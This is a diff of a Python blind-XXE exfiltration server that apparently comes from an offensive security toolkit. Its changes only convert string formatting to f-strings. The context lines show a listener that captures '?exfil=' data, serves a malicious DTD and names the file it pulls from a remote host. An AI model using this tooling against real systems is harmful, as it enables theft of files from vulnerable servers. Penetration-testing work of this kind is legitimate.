@@ -60,7 +60,7 @@ EXFILTRATED_EVENT = threading.Event()
 
 def dbg(x):
     if config['debug']:
-        print('[dbg] {}'.format(x))
+        print(f'[dbg] {x}')
 
 
 class BlindXXEServer(BaseHTTPRequestHandler):
@@ -91,11 +91,9 @@ class BlindXXEServer(BaseHTTPRequestHandler):
     def request_handler(self, request):
         global EXFILTRATED_EVENT
 
-        print('[.] Incoming HTTP request from {}: {} {}'.format(
-            self.client_address[0],
-            request.method,
-            request.path[:25]
-        ))
+        print(
+            f'[.] Incoming HTTP request from {self.client_address[0]}: {request.method} {request.path[:25]}'
+        )
 
         path = urllib.unquote(request.path).decode('utf8')
         m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
@@ -122,7 +120,7 @@ class BlindXXEServer(BaseHTTPRequestHandler):
             self.response(content_type='text/xml', body=dtd)
 
         else:
-            dbg('%s %s' % (request.command, request.path))
+            dbg(f'{request.command} {request.path}')
             self.response(body='false')
 
 
@@ -152,7 +150,7 @@ def parseOptions(argv):
     config['rhost'] = args.rhost
     config['exfil-file'] = args.file
 
-    print('[::] File to be exfiltrated: "{}"'.format(args.file))
+    print(f'[::] File to be exfiltrated: "{args.file}"')
 
     port = int(args.port)
     if port < 1 or port > 65535:
@@ -175,10 +173,10 @@ def main(argv):
         Logger.err('Options parsing failed.')
         return False
 
-    print('[+] Serving HTTP server on: ("{}", {})'.format(
-        config['listen'], config['port']
-    ))
-    dbg('RHOST set to: {}'.format(config['rhost']))
+    print(
+        f"""[+] Serving HTTP server on: ("{config['listen']}", {config['port']})"""
+    )
+    dbg(f"RHOST set to: {config['rhost']}")
 
     rhost = config['listen']
     if config['listen'] == '0.0.0.0':
